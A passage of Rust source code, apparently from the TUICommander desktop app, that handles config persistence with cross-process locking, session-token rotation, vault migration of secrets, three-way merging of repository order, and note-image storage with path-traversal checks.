    save_app_config_with(next.clone(), |disk_config| file.write_atomic(disk_config))?;
    *state.config.write() = next;
    Ok(effects)
}

/// Issue a fresh remote-access session token and persist it.
///
/// Shared by the desktop IPC command and `POST /auth/rotate-session-token`, which each
/// had their own copy. Both copies updated `state.session_token` and the file but never
/// `state.config`, so the in-memory config kept the OLD token — and the next unrelated
/// save wrote that stale token straight back to the vault, silently resurrecting a
/// credential the user had just rotated away. Going through `commit_config_change` keeps
/// the three views (vault, disk, memory) in agreement by construction.
///
/// `state.session_token` is updated only after the write succeeds: a token that could not
/// be persisted must not start authenticating requests it would lose at restart.
pub(crate) fn rotate_session_token(state: &crate::AppState) -> Result<String, String> {
    let new_token = uuid::Uuid::new_v4().to_string();

    commit_config_change(state, |current| {
        let mut next = current.clone();
        next.services.auth.session_token = new_token.clone();
        next.services.auth.session_token_exists = true;
        Ok(next)
    })?;

    *state.session_token.write() = new_token.clone();
    Ok(new_token)
}

/// Read and hydrate `config.json` without taking either config lock.
///
/// The caller decides the locking span because both `load_app_config` and the
/// delta commit path must keep the cross-process lock from this read through a
/// possible rewrite. The boolean reports that plaintext credentials were moved
/// to the vault and the redacted document must be persisted before releasing
/// that lock.
fn read_app_config_unlocked(path: &std::path::Path) -> Result<(AppConfig, bool), String> {
    if !path.exists() {
        return Ok((AppConfig::default(), false));
    }
    let content = match std::fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) => {
            tracing::warn!(path = %path.display(), "Could not read config: {e}");
            return Err(format!("Could not read {}: {e}", path.display()));
        }
    };
    #[cfg(test)]
    test_load_app_config_delay();
    let mut val: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            tracing::error!(path = %path.display(), "Corrupt config: {e}. Using defaults.");
            return Err(format!("Corrupt {}: {e}", path.display()));
        }
    };
    migrate_flat_services(&mut val);
    match serde_json::from_value(val) {
        Ok(mut config) => {
            let migrated_secret = hydrate_app_config_secrets(&mut config);
            Ok((config, migrated_secret))
        }
        Err(e) => {
            tracing::error!(path = %path.display(), "Config deserialization failed after migration: {e}. Using defaults.");
            Err(format!(
                "Config deserialization failed for {}: {e}",
                path.display()
            ))
        }
    }
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_app_config() -> AppConfig {
    // CONFIG_WRITE_LOCK is held across the read AND the conditional migration write
    // below, so a concurrent writer *in this process* can never land between the two.
    // That alone is not enough: a second TUICommander process (e.g. a `make dev` debug
    // build sharing the config dir with the installed release build) is invisible to
    // this mutex. The cross-process file lock must be held for the exact same span —
    // acquired here, before the read, not just at write time — otherwise process A can
    // read, process B can write a newer config, and A's later migration write clobbers
    // B's update with a stale copy.
    let _guard = config_write_lock();
    let file = ConfigFile::<AppConfig>::new(APP_CONFIG_FILE);
    let _file_lock = match file.acquire_file_lock() {
        Ok(lock) => Some(lock),
        Err(e) => {
            // Degrade to the old (in-process-only) protection rather than returning
            // AppConfig::default() and discarding the user's real config over a
            // transient lock failure.
            tracing::warn!(
                "Could not acquire config file lock for load_app_config, proceeding \
                 without cross-process protection: {e}"
            );
            None
        }
    };

    let path = config_dir().join(APP_CONFIG_FILE);
    let (config, migrated_secret) =
        read_app_config_unlocked(&path).unwrap_or_else(|_| (AppConfig::default(), false));
    if migrated_secret {
        // A plaintext secret was just moved into the vault. Rewrite immediately —
        // config_for_disk strips the cleartext — otherwise it stays readable in
        // config.json until some unrelated setting happens to be saved.
        //
        // save_app_config_with, not save_app_config_locked: we already hold both
        // the in-process AND the file lock in this scope. save_app_config_locked
        // persists via write_holding_lock, which would call acquire_file_lock a
        // second time from this same process and deadlock.
        if let Err(e) =
            save_app_config_with(config.clone(), |disk_config| file.write_atomic(disk_config))
        {
            tracing::warn!(
                source = "config",
                "Migrated a secret to the vault but could not rewrite config.json: {e}"
            );
        }
    }
    config
}

/// Acquire both locks and replace the complete AppConfig document.
///
/// This is reserved for bootstrap and explicit replacement paths. Interactive config
/// mutation goes through `commit_config_change`, which applies a delta to the latest
/// locked disk value instead of replacing it with a stale snapshot.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_app_config(config: AppConfig) -> Result<(), String> {
    let _guard = config_write_lock();
    save_app_config_locked(config, &_guard)
}

/// Persist `config`. Precondition: the caller MUST already hold `CONFIG_WRITE_LOCK`
/// — enforced by the `&ConfigWriteGuard` parameter.
fn save_app_config_locked(config: AppConfig, guard: &ConfigWriteGuard) -> Result<(), String> {
    save_app_config_with(config, |disk_config| {
        ConfigFile::<AppConfig>::new(APP_CONFIG_FILE).write_holding_lock(guard, disk_config)
    })
}

fn save_app_config_with<F>(config: AppConfig, persist_disk: F) -> Result<(), String>
where
    F: FnOnce(&AppConfig) -> Result<(), String>,
{
    let snapshot = AppSecretSnapshot::capture()?;
    let result = config_for_disk(config).and_then(|disk_config| persist_disk(&disk_config));
    if let Err(primary) = result {
        return match snapshot.restore() {
            Ok(()) => Err(primary),
            Err(rollback) => Err(format!(
                "{primary}; credential rollback also failed: {rollback}"
            )),
        };
    }
    Ok(())
}

// Notification config
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_notification_config() -> NotificationConfig {
    load_json_config(NOTIFICATION_CONFIG_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_notification_config(config: NotificationConfig) -> Result<(), String> {
    let file: ConfigFile<NotificationConfig> = ConfigFile::new(NOTIFICATION_CONFIG_FILE);
    file.save(&config)
}

// UI prefs
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_ui_prefs() -> UIPrefsConfig {
    load_json_config(UI_PREFS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_ui_prefs(config: UIPrefsConfig) -> Result<(), String> {
    let file: ConfigFile<UIPrefsConfig> = ConfigFile::new(UI_PREFS_FILE);
    file.save(&config)
}

// Repo settings
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_settings() -> RepoSettingsMap {
    load_json_config(REPO_SETTINGS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repo_settings(config: RepoSettingsMap) -> Result<(), String> {
    let file: ConfigFile<RepoSettingsMap> = ConfigFile::new(REPO_SETTINGS_FILE);
    file.save(&config)
}

/// Set or clear a human-readable label for a branch/worktree within a repo.
/// `label = None` removes the label. Idempotent; no-ops on unknown repo paths.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn set_branch_label(
    repo_path: String,
    branch_name: String,
    label: Option<String>,
) -> Result<(), String> {
    let file: ConfigFile<RepoSettingsMap> = ConfigFile::new(REPO_SETTINGS_FILE);
    file.update(|settings| {
        let Some(entry) = settings.repos.get_mut(&repo_path) else {
            return false;
        };
        match &label {
            Some(l) if !l.trim().is_empty() => {
                entry
                    .branch_labels
                    .insert(branch_name.clone(), l.trim().to_string());
            }
            _ => {
                entry.branch_labels.remove(&branch_name);
            }
        }
        true
    })
}

/// Remove a branch label — called by worktree deletion to keep config tidy.
pub(crate) fn remove_branch_label(repo_path: &str, branch_name: &str) {
    let file: ConfigFile<RepoSettingsMap> = ConfigFile::new(REPO_SETTINGS_FILE);
    let result = file.update(|settings| {
        settings
            .repos
            .get_mut(repo_path)
            .is_some_and(|entry| entry.branch_labels.remove(branch_name).is_some())
    });
    if let Err(e) = result {
        tracing::warn!("Failed to save config after removing branch label: {e}");
    }
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn check_has_custom_settings(path: String) -> bool {
    let settings: RepoSettingsMap = load_json_config(REPO_SETTINGS_FILE);
    settings
        .repos
        .get(&path)
        .is_some_and(|entry| entry.has_custom_settings())
}

// Repo local config (.tuic.json in repo root)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_local_config(repo_path: String) -> Option<RepoLocalConfig> {
    load_repo_local_config_from_path(std::path::Path::new(&repo_path))
}

/// Overlay a repo's per-repo overrides onto an existing `.tuic.json` config.
/// Only fields the user explicitly set per-repo (`Some`) are copied; `None`
/// (inherit-from-global) leaves any existing value in `base` untouched, so the
/// committed file stays a sparse, intentional set of choices. Script fields are
/// never copied — `RepoLocalConfig` has none (repo-committed scripts are unsafe
/// to run without a trust prompt).
/// Fill the team-shareable worktree/branch fields of a `RepoLocalConfig` with
/// the global defaults wherever the config doesn't already specify them.
///
/// Used when exporting `.tuic.json` so teammates inherit the user's *effective*
/// settings, not just the (usually empty) set of per-repo overrides. Fields the
/// config already specifies (e.g. a manually-set `.tuic.json` value) are left
/// untouched, and `mcp_upstreams` is never populated from defaults (it has none).
fn fill_repo_local_defaults(
    mut base: RepoLocalConfig,
    defaults: &RepoDefaultsConfig,
) -> RepoLocalConfig {
    if base.base_branch.is_none() {
        base.base_branch = Some(defaults.base_branch.clone());
    }
    if base.copy_ignored_files.is_none() {
        base.copy_ignored_files = Some(defaults.copy_ignored_files);
    }
    if base.copy_untracked_files.is_none() {
        base.copy_untracked_files = Some(defaults.copy_untracked_files);
    }
    if base.worktree_storage.is_none() {
        base.worktree_storage = Some(defaults.worktree_storage.clone());
    }
    if base.delete_branch_on_remove.is_none() {
        base.delete_branch_on_remove = Some(defaults.delete_branch_on_remove);
    }
    if base.auto_archive_merged.is_none() {
        base.auto_archive_merged = Some(defaults.auto_archive_merged);
    }
    if base.orphan_cleanup.is_none() {
        base.orphan_cleanup = Some(defaults.orphan_cleanup.clone());
    }
    if base.pr_merge_strategy.is_none() {
        base.pr_merge_strategy = Some(defaults.pr_merge_strategy.clone());
    }
    if base.after_merge.is_none() {
        base.after_merge = Some(defaults.after_merge.clone());
    }
    if base.auto_delete_on_pr_close.is_none() {
        base.auto_delete_on_pr_close = Some(defaults.auto_delete_on_pr_close.clone());
    }
    base
}

fn overlay_repo_local_config(
    mut base: RepoLocalConfig,
    entry: &RepoSettingsEntry,
) -> RepoLocalConfig {
    if entry.base_branch.is_some() {
        base.base_branch = entry.base_branch.clone();
    }
    if entry.copy_ignored_files.is_some() {
        base.copy_ignored_files = entry.copy_ignored_files;
    }
    if entry.copy_untracked_files.is_some() {
        base.copy_untracked_files = entry.copy_untracked_files;
    }
    if entry.worktree_storage.is_some() {
        base.worktree_storage = entry.worktree_storage.clone();
    }
    if entry.delete_branch_on_remove.is_some() {
        base.delete_branch_on_remove = entry.delete_branch_on_remove;
    }
    if entry.auto_archive_merged.is_some() {
        base.auto_archive_merged = entry.auto_archive_merged;
    }
    if entry.orphan_cleanup.is_some() {
        base.orphan_cleanup = entry.orphan_cleanup.clone();
    }
    if entry.pr_merge_strategy.is_some() {
        base.pr_merge_strategy = entry.pr_merge_strategy.clone();
    }
    if entry.after_merge.is_some() {
        base.after_merge = entry.after_merge.clone();
    }
    if entry.auto_delete_on_pr_close.is_some() {
        base.auto_delete_on_pr_close = entry.auto_delete_on_pr_close.clone();
    }
    if entry.mcp_upstreams.is_some() {
        base.mcp_upstreams = entry.mcp_upstreams.clone();
    }
    base
}

/// Write the repo's per-repo UI settings into `.tuic.json` at its root so they
/// can be committed and shared with the team. Preserves any existing `.tuic.json`
/// values for fields left as inherit-from-global.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repo_local_config(repo_path: String) -> Result<(), String> {
    let dir = std::path::Path::new(&repo_path);
    let entry = load_repo_settings().repos.remove(&repo_path);
    // Start from the existing .tuic.json so manually-set fields (e.g. mcp_upstreams) survive.
    let base = load_repo_local_config_from_path(dir).unwrap_or_default();
    // Fill worktree/branch fields with global defaults so the export captures the
    // user's effective settings, not just the (usually empty) per-repo overrides —
    // otherwise a user who relies on global defaults exports an empty {} file.
    let base = fill_repo_local_defaults(base, &load_repo_defaults());
    // Per-repo overrides win over both .tuic.json and global defaults.
    let merged = match entry.as_ref() {
        Some(e) => overlay_repo_local_config(base, e),
        None => base,
    };
    let json = serde_json::to_string_pretty(&merged).map_err(|e| e.to_string())?;
    let file = dir.join(REPO_LOCAL_CONFIG_FILE);
    persist_atomic(&file, json.as_bytes())
        .map_err(|e| format!("Failed to write {}: {e}", file.display()))?;
    Ok(())
}

// Repo defaults (global defaults for all repos)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repo_defaults() -> RepoDefaultsConfig {
    load_json_config(REPO_DEFAULTS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repo_defaults(config: RepoDefaultsConfig) -> Result<(), String> {
    let file: ConfigFile<RepoDefaultsConfig> = ConfigFile::new(REPO_DEFAULTS_FILE);
    file.save(&config)
}

/// Resolve the effective setup script for a repo using the three-tier hierarchy:
/// per-repo override > global defaults. Returns `None` if the resolved script is empty.
pub(crate) fn resolve_effective_setup_script(repo_path: &str) -> Option<String> {
    let settings: RepoSettingsMap = load_json_config(REPO_SETTINGS_FILE);
    let defaults: RepoDefaultsConfig = load_json_config(REPO_DEFAULTS_FILE);
    resolve_setup_script_from(&settings, &defaults, repo_path)
}

fn resolve_setup_script_from(
    settings: &RepoSettingsMap,
    defaults: &RepoDefaultsConfig,
    repo_path: &str,
) -> Option<String> {
    if let Some(Some(script)) = settings.repos.get(repo_path).map(|e| &e.setup_script) {
        return if script.is_empty() {
            None
        } else {
            Some(script.clone())
        };
    }
    if !defaults.setup_script.is_empty() {
        return Some(defaults.setup_script.clone());
    }
    None
}

// Repositories (opaque JSON — schema owned by frontend)

const REPOSITORY_MUTATION_VERSION: u8 = 1;

/// One optimistic mutation of an ID-keyed JSON record. `None` means the record
/// did not exist (`before`) or must be removed (`after`). The expectation is
/// checked while holding the cross-process file lock, so a stale client can
/// never overwrite a concurrent edit to the same repository/group silently.
#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct KeyedRepositoryMutation {
    id: String,
    before: Option<serde_json::Value>,
    after: Option<serde_json::Value>,
}

#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct RepositoryFieldMutation {
    before: serde_json::Value,
    after: serde_json::Value,
}

/// Delta protocol carried inside the existing `save_repositories(config)`
/// argument and `PUT /config/repositories` body. Keeping the existing command
/// and route means desktop IPC and browser HTTP use the exact same contract.
#[derive(Debug, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
struct RepositoryMutationBatch {
    mutation_version: u8,
    #[serde(default)]
    repos: Vec<KeyedRepositoryMutation>,
    #[serde(default)]
    groups: Vec<KeyedRepositoryMutation>,
    #[serde(default)]
    repo_order: Option<RepositoryFieldMutation>,
    #[serde(default)]
    active_repo_path: Option<RepositoryFieldMutation>,
    #[serde(default)]
    group_order: Option<RepositoryFieldMutation>,
}

#[derive(Debug)]
pub(crate) enum RepositorySaveError {
    Conflict(String),
    Invalid(String),
    Io(String),
}

impl std::fmt::Display for RepositorySaveError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Conflict(message) => write!(f, "repository configuration conflict: {message}"),
            Self::Invalid(message) => write!(f, "invalid repository mutation: {message}"),
            Self::Io(message) => write!(f, "{message}"),
        }
    }
}

fn json_option_eq(
    current: Option<&serde_json::Value>,
    expected: &Option<serde_json::Value>,
) -> bool {
    match (current, expected) {
        (None, None) => true,
        (Some(current), Some(expected)) => current == expected,
        _ => false,
    }
}

fn validate_keyed_value(
    collection: &str,
    id: &str,
    value: &Option<serde_json::Value>,
) -> Result<(), RepositorySaveError> {
    let Some(value) = value else {
        return Ok(());
    };
    let object = value.as_object().ok_or_else(|| {
        RepositorySaveError::Invalid(format!("{collection} record '{id}' must be an object"))
    })?;
    let identity_field = if collection == "repos" { "path" } else { "id" };
    if let Some(identity) = object.get(identity_field).and_then(|value| value.as_str())
        && identity != id
    {
        return Err(RepositorySaveError::Invalid(format!(
            "{collection} record '{id}' carries mismatched {identity_field} '{identity}'"
        )));
    }
    Ok(())
}

fn apply_keyed_repository_mutations(
    document: &mut serde_json::Map<String, serde_json::Value>,
    collection: &str,
    mutations: &[KeyedRepositoryMutation],
) -> Result<bool, RepositorySaveError> {
    if mutations.is_empty() {
        return Ok(false);
    }

    let records = document
        .entry(collection.to_string())
        .or_insert_with(|| serde_json::Value::Object(serde_json::Map::new()))
        .as_object_mut()
        .ok_or_else(|| RepositorySaveError::Invalid(format!("'{collection}' must be an object")))?;
    let mut seen = std::collections::HashSet::new();
    let mut changed = false;

    for mutation in mutations {
        if mutation.id.is_empty() {
            return Err(RepositorySaveError::Invalid(format!(
                "{collection} record id must not be empty"
            )));
        }
        if !seen.insert(mutation.id.as_str()) {
            return Err(RepositorySaveError::Invalid(format!(
                "duplicate {collection} mutation for '{}'",
                mutation.id
            )));
        }
        validate_keyed_value(collection, &mutation.id, &mutation.before)?;
        validate_keyed_value(collection, &mutation.id, &mutation.after)?;

        let current = records.get(&mutation.id);
        if json_option_eq(current, &mutation.after) {
            continue;
        }
        if !json_option_eq(current, &mutation.before) {
            let kind = if collection == "repos" {
                "repository"
            } else {
                "group"
            };
            return Err(RepositorySaveError::Conflict(format!(
                "{kind} '{}' changed in another window; reload before retrying",
                mutation.id
            )));
        }

        match &mutation.after {
            Some(after) => {
                records.insert(mutation.id.clone(), after.clone());
            }
            None => {
                records.remove(&mutation.id);
            }
        }
        changed = true;
    }

    Ok(changed)
}

fn string_order(
    value: &serde_json::Value,
    field: &str,
) -> Result<Vec<String>, RepositorySaveError> {
    serde_json::from_value(value.clone()).map_err(|_| {
        RepositorySaveError::Invalid(format!(
            "'{field}' before/after values must be string arrays"
        ))
    })
}

fn filtered_order(order: &[String], keep: &std::collections::HashSet<&str>) -> Vec<String> {
    order
        .iter()
        .filter(|id| keep.contains(id.as_str()))
        .cloned()
        .collect()
}

fn reordered_relative_to(base: &[String], other: &[String]) -> bool {
    let other_ids: std::collections::HashSet<&str> = other.iter().map(String::as_str).collect();
    let base_ids: std::collections::HashSet<&str> = base.iter().map(String::as_str).collect();
    filtered_order(base, &other_ids) != filtered_order(other, &base_ids)
}

/// Apply only membership changes from `before -> after` to an independently
/// ordered list. New IDs are inserted beside the nearest surviving neighbour
/// from `after`; if there is no common anchor they append deterministically.
fn apply_order_membership_delta(result: &mut Vec<String>, before: &[String], after: &[String]) {
    result.retain(|id| !before.contains(id) || after.contains(id));

    for (index, id) in after.iter().enumerate() {
        if before.contains(id) || result.contains(id) {
            continue;
        }

        let previous = after[..index]
            .iter()
            .rev()
            .find_map(|candidate| result.iter().position(|existing| existing == candidate));
        if let Some(previous) = previous {
            result.insert(previous + 1, id.clone());
            continue;
        }

        let next = after[index + 1..]
            .iter()
            .find_map(|candidate| result.iter().position(|existing| existing == candidate));
        if let Some(next) = next {
            result.insert(next, id.clone());
        } else {
            result.push(id.clone());
        }
    }
}

/// Three-way merge for `repoOrder`/`groupOrder`. Independent additions and
/// removals compose. Two clients that reorder the same pre-existing IDs must
/// agree on their relative order; otherwise the caller receives a conflict.
fn merge_repository_order(
    field: &str,
    before: &[String],
    after: &[String],
    current: &[String],
) -> Result<Vec<String>, RepositorySaveError> {
    if current == before || current == after {
        return Ok(if current == before {
            after.to_vec()
        } else {
            current.to_vec()
        });
    }

    let client_reordered = reordered_relative_to(before, after);
    let concurrent_reordered = reordered_relative_to(before, current);
    if client_reordered && concurrent_reordered {
        let common: std::collections::HashSet<&str> = before
            .iter()
            .filter(|id| after.contains(id) && current.contains(id))
            .map(String::as_str)
            .collect();
        if filtered_order(after, &common) != filtered_order(current, &common) {
            return Err(RepositorySaveError::Conflict(format!(
                "{field} was reordered differently in another window; reload before retrying"
            )));
        }
    }

    let mut merged = if client_reordered && !concurrent_reordered {
        let mut desired = after.to_vec();
        apply_order_membership_delta(&mut desired, before, current);
        desired
    } else {
        let mut latest = current.to_vec();
        apply_order_membership_delta(&mut latest, before, after);
        latest
    };
    // Old files may already contain duplicate order entries. Do not propagate
    // them into a newly merged result, but preserve first-occurrence order.
    let mut seen = std::collections::HashSet::new();
    merged.retain(|id| seen.insert(id.clone()));
    Ok(merged)
}

fn apply_order_mutation(
    document: &mut serde_json::Map<String, serde_json::Value>,
    field: &str,
    mutation: &Option<RepositoryFieldMutation>,
) -> Result<bool, RepositorySaveError> {
    let Some(mutation) = mutation else {
        return Ok(false);
    };
    let before = string_order(&mutation.before, field)?;
    let after = string_order(&mutation.after, field)?;
    let current = document
        .get(field)
        .map(|value| string_order(value, field))
        .transpose()?
        .unwrap_or_default();
    let merged = merge_repository_order(field, &before, &after, &current)?;
    if merged == current {
        return Ok(false);
    }
    document.insert(field.to_string(), serde_json::json!(merged));
    Ok(true)
}

fn valid_active_repo_path(value: &serde_json::Value) -> bool {
    value.is_null() || value.as_str().is_some()
}

fn apply_active_repository_mutation(
    document: &mut serde_json::Map<String, serde_json::Value>,
    mutation: &Option<RepositoryFieldMutation>,
) -> Result<bool, RepositorySaveError> {
    let Some(mutation) = mutation else {
        return Ok(false);
    };
    if !valid_active_repo_path(&mutation.before) || !valid_active_repo_path(&mutation.after) {
        return Err(RepositorySaveError::Invalid(
            "'activeRepoPath' before/after values must be a string or null".to_string(),
        ));
    }
    let current = document
        .get("activeRepoPath")
        .cloned()
        .unwrap_or(serde_json::Value::Null);
    if current == mutation.after {
        return Ok(false);
    }
    if current != mutation.before {
        return Err(RepositorySaveError::Conflict(
            "active repository changed in another window; reload before retrying".to_string(),
        ));
    }
    document.insert("activeRepoPath".to_string(), mutation.after.clone());
    Ok(true)
}

fn apply_repository_mutation_batch(
    value: &mut serde_json::Value,
    batch: &RepositoryMutationBatch,
) -> Result<bool, RepositorySaveError> {
    if batch.mutation_version != REPOSITORY_MUTATION_VERSION {
        return Err(RepositorySaveError::Invalid(format!(
            "unsupported mutationVersion {}",
            batch.mutation_version
        )));
    }
    if value.is_null() {
        *value = serde_json::Value::Object(serde_json::Map::new());
    }
    let document = value.as_object_mut().ok_or_else(|| {
        RepositorySaveError::Invalid("repositories.json root must be an object".to_string())
    })?;

    let mut changed = false;
    changed |= apply_keyed_repository_mutations(document, "repos", &batch.repos)?;
    changed |= apply_keyed_repository_mutations(document, "groups", &batch.groups)?;
    changed |= apply_order_mutation(document, "repoOrder", &batch.repo_order)?;
    changed |= apply_active_repository_mutation(document, &batch.active_repo_path)?;
    changed |= apply_order_mutation(document, "groupOrder", &batch.group_order)?;
    Ok(changed)
}

fn repository_file() -> PathBuf {
    config_dir().join(REPOSITORIES_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_repositories() -> serde_json::Value {
    load_json_config_from_path(&repository_file())
}

pub(crate) fn save_repositories_request(
    config: serde_json::Value,
) -> Result<(), RepositorySaveError> {
    let batch: RepositoryMutationBatch = serde_json::from_value(config).map_err(|error| {
        RepositorySaveError::Invalid(format!("could not decode delta: {error}"))
    })?;
    let file: ConfigFile<serde_json::Value> = ConfigFile::at_path(repository_file());
    let mut mutation_error = None;
    let result =
        file.update_with_strict(
            |value| match apply_repository_mutation_batch(value, &batch) {
                Ok(changed) => Ok(((), changed)),
                Err(error) => {
                    mutation_error = Some(error);
                    Err("repository mutation rejected".to_string())
                }
            },
        );
    match (result, mutation_error) {
        (Ok(()), _) => Ok(()),
        (Err(_), Some(error)) => Err(error),
        (Err(error), None) => Err(RepositorySaveError::Io(error)),
    }
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_repositories(config: serde_json::Value) -> Result<(), String> {
    save_repositories_request(config).map_err(|error| error.to_string())
}

#[cfg(test)]
pub(crate) fn replace_repositories_for_test(config: serde_json::Value) -> Result<(), String> {
    ConfigFile::<serde_json::Value>::at_path(repository_file()).save(&config)
}

// Pane layout (schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_pane_layout() -> serde_json::Value {
    load_json_config(PANE_LAYOUT_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_pane_layout(layout: serde_json::Value) -> Result<(), String> {
    let file: ConfigFile<serde_json::Value> = ConfigFile::new(PANE_LAYOUT_FILE);
    file.save(&layout)
}

// Prompt library
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_prompt_library() -> PromptLibraryConfig {
    load_json_config(PROMPT_LIBRARY_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_prompt_library(config: PromptLibraryConfig) -> Result<(), String> {
    let file: ConfigFile<PromptLibraryConfig> = ConfigFile::new(PROMPT_LIBRARY_FILE);
    file.save(&config)
}

// Notes (opaque JSON — schema owned by frontend)
//
// Unlike every other config this one FAILS instead of defaulting: the frontend refuses to
// persist until a load succeeds, so an unreadable notes.json can no longer be silently
// replaced by an empty array on the next mutation (GH #107).
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_notes() -> Result<serde_json::Value, String> {
    load_json_config_strict(NOTES_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_notes(config: serde_json::Value) -> Result<(), String> {
    let file: ConfigFile<serde_json::Value> = ConfigFile::new(NOTES_FILE);
    file.save(&config)
}

// Activity center (opaque JSON — schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_activity() -> serde_json::Value {
    load_json_config(ACTIVITY_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_activity(items: serde_json::Value) -> Result<(), String> {
    let file: ConfigFile<serde_json::Value> = ConfigFile::new(ACTIVITY_FILE);
    file.save(&items)
}

// Keybindings (opaque JSON — schema owned by frontend)
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_keybindings() -> serde_json::Value {
    load_json_config(KEYBINDINGS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_keybindings(config: serde_json::Value) -> Result<(), String> {
    let file: ConfigFile<serde_json::Value> = ConfigFile::new(KEYBINDINGS_FILE);
    file.save(&config)
}

// Agents config
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_agents_config() -> AgentsConfig {
    load_json_config(AGENTS_CONFIG_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_agents_config(config: AgentsConfig) -> Result<(), String> {
    let file: ConfigFile<AgentsConfig> = ConfigFile::new(AGENTS_CONFIG_FILE);
    file.save(&config)
}

// AI prompts
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn load_ai_prompts() -> AiPromptsConfig {
    load_json_config(AI_PROMPTS_FILE)
}

#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_ai_prompts(config: AiPromptsConfig) -> Result<(), String> {
    let file: ConfigFile<AiPromptsConfig> = ConfigFile::new(AI_PROMPTS_FILE);
    file.save(&config)
}

// ---------------------------------------------------------------------------
// Note images — save/delete/get for Ideas panel image attachments
// ---------------------------------------------------------------------------

pub(crate) const NOTE_IMAGES_DIR: &str = "note-images";

/// Maximum decoded image size: 10 MB
const MAX_IMAGE_SIZE: usize = 10 * 1024 * 1024;

/// Validate a note ID to prevent path traversal attacks.
/// Rejects IDs containing `/`, `\`, `..`, or null bytes.
fn validate_note_id(note_id: &str) -> Result<(), String> {
    if note_id.is_empty() {
        return Err("note_id must not be empty".to_string());
    }
    if note_id.contains('/')
        || note_id.contains('\\')
        || note_id.contains("..")
        || note_id.contains('\0')
    {
        return Err("note_id contains invalid characters".to_string());
    }
    Ok(())
}

/// Save a base64-encoded image to `config_dir()/note-images/<note_id>/<timestamp>.<extension>`.
/// Returns the absolute path of the saved file.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn save_note_image(
    note_id: String,
    data_base64: String,
    extension: String,
) -> Result<String, String> {
    use base64::{Engine as _, engine::general_purpose};

    validate_note_id(&note_id)?;

    let bytes = general_purpose::STANDARD
        .decode(&data_base64)
        .map_err(|e| format!("Invalid base64 data: {e}"))?;

    if bytes.len() > MAX_IMAGE_SIZE {
        return Err(format!(
            "Image too large: {} bytes (max {} bytes)",
            bytes.len(),
            MAX_IMAGE_SIZE
        ));
    }

    // Sanitize extension to alphanumeric only
    let ext = extension
        .chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .collect::<String>();
    let ext = if ext.is_empty() {
        "png".to_string()
    } else {
        ext
    };

    let dir = config_dir().join(NOTE_IMAGES_DIR).join(&note_id);
    std::fs::create_dir_all(&dir).map_err(|e| format!("Failed to create note-images dir: {e}"))?;

    let filename = format!(
        "{}.{}",
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis(),
        ext
    );
    let path = dir.join(&filename);

    persist_atomic(&path, &bytes)?;

    Ok(path.to_string_lossy().to_string())
}

/// Delete all image assets for a note. No-op if the directory doesn't exist.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn delete_note_assets(note_id: String) -> Result<(), String> {
    validate_note_id(&note_id)?;

    let dir = config_dir().join(NOTE_IMAGES_DIR).join(&note_id);
    if dir.exists() {
        std::fs::remove_dir_all(&dir).map_err(|e| format!("Failed to delete note assets: {e}"))?;
    }
    Ok(())
}

/// Delete image assets for multiple notes in a single IPC round-trip.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn delete_note_assets_batch(note_ids: Vec<String>) -> Result<(), String> {
    let base = config_dir().join(NOTE_IMAGES_DIR);
    for note_id in &note_ids {
        validate_note_id(note_id)?;
        let dir = base.join(note_id);
        if dir.exists() {
            std::fs::remove_dir_all(&dir)
                .map_err(|e| format!("Failed to delete note assets for {note_id}: {e}"))?;
        }
    }
    Ok(())
}

/// Return the absolute path of the note-images root directory.
/// The frontend needs this as `baseDir` for `convertFileSrc()`.
#[cfg_attr(feature = "desktop", tauri::command)]
pub(crate) fn get_note_images_dir() -> String {
    config_dir()
        .join(NOTE_IMAGES_DIR)
        .to_string_lossy()
        .to_string()
}

